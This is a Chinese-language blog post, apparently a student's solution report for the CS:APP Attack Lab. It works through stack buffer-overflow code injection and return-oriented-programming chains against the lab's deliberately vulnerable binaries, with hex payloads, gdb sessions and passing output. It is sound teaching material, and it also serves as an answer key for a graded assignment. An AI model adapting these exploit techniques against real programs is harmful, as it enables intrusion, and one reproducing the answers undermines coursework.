@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!--icon-->
+    
+        <link rel="shortcut icon" type='image/x-icon' href="/favicon.ico">
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!-- meta -->
+    
+    <title>CS:APP Lab 3 解题报告 - 64位 | Nameless Blog</title>
+    
+        <meta name="keywords" content="CSAPP">
+    
+
+    <!-- OpenGraph -->
+     
+        <meta name="description" content="CSAPP 的 Lab 3 在第三版之前都是所谓的 Buffer Lab，而 CSAPP 第三版的配套 Lab 3 则是 Attack Lab。因为我们学校新开的计算机系统基础课可能要以此为实验，故再来重新感受一番。该 Lab 的实验流程与 Buffer Lab 基本相同，我们直接开始。本次实验笔者使用的环境为 Ubuntu 18.04。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CS:APP Lab 3 解题报告 - 64位">
+<meta property="og:url" content="https://blog.name1e5s.com/ckdlp3ay60007zo3ueoq8hxgv/index.html">
+<meta property="og:site_name" content="Nameless Blog">
+<meta property="og:description" content="CSAPP 的 Lab 3 在第三版之前都是所谓的 Buffer Lab，而 CSAPP 第三版的配套 Lab 3 则是 Attack Lab。因为我们学校新开的计算机系统基础课可能要以此为实验，故再来重新感受一番。该 Lab 的实验流程与 Buffer Lab 基本相同，我们直接开始。本次实验笔者使用的环境为 Ubuntu 18.04。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-09-28T13:00:00.000Z">
+<meta property="article:modified_time" content="2019-06-27T17:08:02.000Z">
+<meta property="article:author" content="Name1e5s">
+<meta property="article:tag" content="CSAPP">
+<meta name="twitter:card" content="summary_large_image">
+    
+
+    <!-- feed -->
+    
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+    
+    
+        
+<link rel="stylesheet" href="/css/style/dark.css">
+
+        
+<script src="/js/darkmode.js"></script>
+
+    
+
+    
+        
+            <link rel="stylesheet" id="hljs-default-theme" href="/css/highlight/default.css" media="none" onload="if(getComputedStyle(document.documentElement).getPropertyValue('--color-mode').indexOf('dark')===-1)this.media='all'">
+            
+                <link rel="stylesheet" id="hljs-dark-theme" href="/css/highlight/dark.css" media="none" onload="if(getComputedStyle(document.documentElement).getPropertyValue('--color-mode').indexOf('dark')!==-1)this.media='all'">
+            
+        
+    
+
+    
+        <link rel="stylesheet" href="/css/style/note.css" media="none" onload="this.media='all'">
+    
+
+     
+
+    
+
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+    <body>
+        <div id="app">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">
+                Nameless Blog 
+            </span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="cover__menus">
+                
+                    <a href="/" class="cover-menu button">
+                        首页
+                    </a>
+                
+                    <a href="/friends/" class="cover-menu button">
+                        友链
+                    </a>
+                
+                    <a href="/about/" class="cover-menu button">
+                        关于
+                    </a>
+                
+            </div>
+        
+        
+            <a href="javaScript:void(0);" id="btn-toggle-dark">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+            </a>
+        
+         
+            <a href="javaScript:void(0);" id="b2t" style="" aria-label="回到顶部" title="回到顶部">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='32' height='32' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M13.889,11.611c-0.17,0.17-0.443,0.17-0.612,0l-3.189-3.187l-3.363,3.36c-0.171,0.171-0.441,0.171-0.612,0c-0.172-0.169-0.172-0.443,0-0.611l3.667-3.669c0.17-0.17,0.445-0.172,0.614,0l3.496,3.493C14.058,11.167,14.061,11.443,13.889,11.611 M18.25,10c0,4.558-3.693,8.25-8.25,8.25c-4.557,0-8.25-3.692-8.25-8.25c0-4.557,3.693-8.25,8.25-8.25C14.557,1.75,18.25,5.443,18.25,10 M17.383,10c0-4.07-3.312-7.382-7.383-7.382S2.618,5.93,2.618,10S5.93,17.381,10,17.381S17.383,14.07,17.383,10"></path>
+                </svg>
+            </a>
+        
+        
+            <a class="dropdown-icon button" id="btn-dropdown">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round">
+                    <path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path>
+                </svg>
+            </a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                <a class="dropback-icon button" id="btn-dropback">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round">
+                        <path fill="currentColor" d="M11.469,10l7.08-7.08c0.406-0.406,0.406-1.064,0-1.469c-0.406-0.406-1.063-0.406-1.469,0L10,8.53l-7.081-7.08c-0.406-0.406-1.064-0.406-1.469,0c-0.406,0.406-0.406,1.063,0,1.469L8.531,10L1.45,17.081c-0.406,0.406-0.406,1.064,0,1.469c0.203,0.203,0.469,0.304,0.735,0.304c0.266,0,0.531-0.101,0.735-0.304L10,11.469l7.08,7.081c0.203,0.203,0.469,0.304,0.735,0.304c0.267,0,0.532-0.101,0.735-0.304c0.406-0.406,0.406-1.064,0-1.469L11.469,10z"></path>
+                    </svg>
+                </a>
+                
+                    <a href="/" class="dropdown-menu button">
+                        首页
+                    </a>
+                
+                    <a href="/friends/" class="dropdown-menu button">
+                        友链
+                    </a>
+                
+                    <a href="/about/" class="dropdown-menu button">
+                        关于
+                    </a>
+                
+            </div>
+            <script>
+                document.getElementById('btn-dropdown').addEventListener('click', () => {
+                    const dd = document.getElementById('dropdown-menus');
+                    requestAnimationFrame(() => {
+                        dd.style.display = 'flex';
+                        requestAnimationFrame(() => {
+                            dd.style.transform = 'translateY(0)';
+                            dd.style.opacity = '1';
+                        });
+                    });
+                });
+                document.getElementById('btn-dropback').addEventListener('click', () => {
+                    const dd = document.getElementById('dropdown-menus');
+                    dd.style.transform = 'translateY(2.25rem)';                    
+                    dd.style.opacity = '0';
+                    setTimeout(() => {dd.style.display = 'none';}, 350);
+                });
+            </script>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    <div class="post-title">
+    <h1 class="post-title__text">
+        CS:APP Lab 3 解题报告 - 64位
+    </h1>
+    <div class="post-title__meta">
+        
+            <a href="/archives/2018/09/" class="button" style="color: #808080;">
+    2018-09-28
+</a>
+        
+        
+            
+    <span class="separate-dot"></span><a href="/categories/CSAPP/" class="button">CSAPP</a>
+
+ 
+        
+        
+     
+ 
+
+  
+    </div>
+</div>
+
+
+    <div class="post__with-side">
+        <aside class="post-side">
+            <div class="post-side__toc">
+                <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Part-I-Code-Injection-Attacks"><span class="toc-text">Part I: Code Injection Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-1"><span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-2"><span class="toc-text">Level 2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-3"><span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Part-II-Return-Oriented-Programming"><span class="toc-text">Part II: Return-Oriented Programming</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-2-1"><span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-3-1"><span class="toc-text">Level 3</span></a></li></ol>
+            </div>
+        </aside>
+        <article class="post content-card">
+            <div class="post__header">
+                
+                     
+                
+                
+                    
+                
+            </div>
+            <div class="post__content">
+                <div class="md-content">
+                    <p>CSAPP 的 Lab 3 在第三版之前都是所谓的 Buffer Lab，而 CSAPP 第三版的配套 Lab 3 则是 Attack Lab。因为我们学校新开的计算机系统基础课可能要以此为实验，故再来重新感受一番。该 Lab 的实验流程与 Buffer Lab 基本相同，我们直接开始。本次实验笔者使用的环境为 Ubuntu 18.04。</p>
+<a id="more"></a>
+
+<h3 id="Part-I-Code-Injection-Attacks"><a href="#Part-I-Code-Injection-Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h3><p>按照惯例，我们先把 <code>ctarget</code> 的反汇编码保留一份。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.S</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h4><p>这一阶段我们要做的就是调用 <code>touch1()</code> 函数，我们先找到该函数的地址，为 <code>00000000004017c0</code>，</p>
+<p>再看一下 getbuf 的内容，上面赫然写着 ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub    $0x28,%rsp</span><br></pre></td></tr></table></figure>
+
+<p>显然我们只需要随便输入 <code>0x28</code> 个字节的内容然后输入 <code>touch1()</code> 的地址即可。因此构造答案：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">66 66 66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66 66 66</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>运行答案：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name1e5s@sumeru:~/csapp/attacklab-name1e5s/target1$ ./hex2raw &lt; p1l1.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h4><p>第二题我们要做的是调用 <code>touch2()</code> 并提供正确的 <code>cookie</code> 值，我们需要先写出相应的汇编代码，并将之通过 WriteUp 的附录 B 提供的方法转换成字节表示即可。汇编码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>将之处理后我们需要确定 <code>getbuf()</code> 的栈顶位置，这个使用 gdb 可以很容易就发现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">name1e5s@sumeru:~&#x2F;csapp&#x2F;attacklab-name1e5s&#x2F;target1$ gdb .&#x2F;ctarget</span><br><span class="line">GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http:&#x2F;&#x2F;gnu.org&#x2F;licenses&#x2F;gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;gdb&#x2F;bugs&#x2F;&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;gdb&#x2F;documentation&#x2F;&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from .&#x2F;ctarget...done.</span><br><span class="line">(gdb) set args -q</span><br><span class="line">(gdb) b getbuf</span><br><span class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</span><br><span class="line">(gdb) run</span><br><span class="line">Starting program: &#x2F;home&#x2F;name1e5s&#x2F;csapp&#x2F;attacklab-name1e5s&#x2F;target1&#x2F;ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, getbuf () at buf.c:12</span><br><span class="line">12      buf.c: No such file or directory.</span><br><span class="line">(gdb) ni</span><br><span class="line">14      in buf.c</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp</span><br><span class="line">&#x3D;&gt; 0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:     callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) i r</span><br><span class="line">rax            0x0      0</span><br><span class="line">rbx            0x55586000       1431855104</span><br><span class="line">rcx            0x0      0</span><br><span class="line">rdx            0x7ffff7dd18c0   140737351850176</span><br><span class="line">rsi            0xc      12</span><br><span class="line">rdi            0x606260 6316640</span><br><span class="line">rbp            0x55685fe8       0x55685fe8</span><br><span class="line">rsp            0x5561dc78       0x5561dc78</span><br><span class="line">r8             0x7ffff7fed540   140737354061120</span><br><span class="line">r9             0x0      0</span><br><span class="line">r10            0x4032b4 4207284</span><br><span class="line">r11            0x7ffff7b72f50   140737349365584</span><br><span class="line">r12            0x2      2</span><br><span class="line">r13            0x0      0</span><br><span class="line">r14            0x0      0</span><br><span class="line">r15            0x0      0</span><br><span class="line">rip            0x4017ac 0x4017ac &lt;getbuf+4&gt;</span><br><span class="line">eflags         0x216    [ PF AF IF ]</span><br><span class="line">cs             0x33     51</span><br><span class="line">ss             0x2b     43</span><br><span class="line">ds             0x0      0</span><br><span class="line">es             0x0      0</span><br><span class="line">fs             0x0      0</span><br><span class="line">gs             0x0      0</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+
+<p>因此栈顶为 <code>0x5561dc78</code>，我们可以写出对应的答案：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 c3 ;; mov $0x59b997fa,%rdi ret</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>运行之：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name1e5s@sumeru:~&#x2F;csapp&#x2F;attacklab-name1e5s&#x2F;target1$ .&#x2F;hex2raw &lt; p1l2.txt | .&#x2F;ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 C3 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>此关需要传入 <code>cookie</code> 转为字符串后的位置，我们继续利用那段宝贵的栈空间解决问题（，答案如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 80 dc 61 55 c3 ;; mov $0x59b997fa,%rdi ret</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>…显然这么做是不行的，因为这段空间后来已经被处理掉了，所以我们需要自力更生自己造空间：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">48 8d 7c 24 10 c3 66 66 ; lea 16(%rsp),%rdi ret</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name1e5s@sumeru:~/csapp/attacklab-name1e5s/target1$ ./hex2raw &lt; p1l3.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3:48 8D 7C 24 10 C3 66 66 35 39 62 39 39 37 66 61 00 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 78 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00 66 66 66 66 66 66 66 66 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+
+<h3 id="Part-II-Return-Oriented-Programming"><a href="#Part-II-Return-Oriented-Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h3><p>按惯例我们先反汇编下。</p>
+<h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>本关的要求和上一节 Level 类似，我们要做的就是再给定的限制条件下搞定此问题。根据 WriteUp 上的限制条件，我们只可以使用有限的几个指令。这样我们只能曲线救国，即把我们的 <code>cookie</code> 放在栈上然后 <code>pop</code> 到合适的地方。也就是说，我们需要执行如下指令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">&lt;cookie&gt;</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">&lt;function touch2&gt;</span><br></pre></td></tr></table></figure>
+
+<p>众所周知 <code>popq %rax</code> 的机器码是 <code>0x58</code>，<code>movq %rax,%rdi</code> 的机器码为 <code>0x48 0x89 0xc7</code>。经过搜索，我们发现在 <code>4019ab</code> 处有如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:    8d 87 51 73 58 90        lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:    c3                       retq   </span><br></pre></td></tr></table></figure>
+
+<p>其中的 <code>58 90 c3</code> 构成如下汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop %rax</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>0x4019a2</code> 内有如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:    8d 87 48 89 c7 c3        lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:    c3</span><br></pre></td></tr></table></figure>
+
+<p>其中的 <code>48 89 c7 c3</code>构成如下汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>利用这两片代码，我们可以轻易地构造出答案：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">ab 19 40 00 00 00 00 00 ; 0x4019ab</span><br><span class="line">fa 97 b9 59 00 00 00 00 ; cookie</span><br><span class="line">a2 19 40 00 00 00 00 00 ; 0x4019a2</span><br><span class="line">ec 17 40 00 00 00 00 00 ; touch2()</span><br></pre></td></tr></table></figure>
+
+<p>运行之：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name1e5s@sumeru:~&#x2F;csapp&#x2F;attacklab-name1e5s&#x2F;target1$ .&#x2F;hex2raw &lt; p2l2.txt | .&#x2F;rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2:66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>这一题是全实验最难的地方，经过良久查找，我发现可以拼凑成如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x401a06       movq %rsp, %rax</span><br><span class="line">0x4019c5       movq %rax, %rdi</span><br><span class="line">0x4019ab       popq %rax      </span><br><span class="line">offset</span><br><span class="line">0x4019dd       movl %eax, %edx</span><br><span class="line">0x401a34       movl %edx, %ecx</span><br><span class="line">0x401a13       movl %ecx, %esi</span><br><span class="line">0x4019d6       lea (%rdi,%rsi,1),%rax</span><br><span class="line">0x4019c5       movq %rax, %rdi</span><br><span class="line">touch3</span><br><span class="line">cookie</span><br></pre></td></tr></table></figure>
+
+<p>构造答案如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">66 66 66 66 66 66 66 66</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
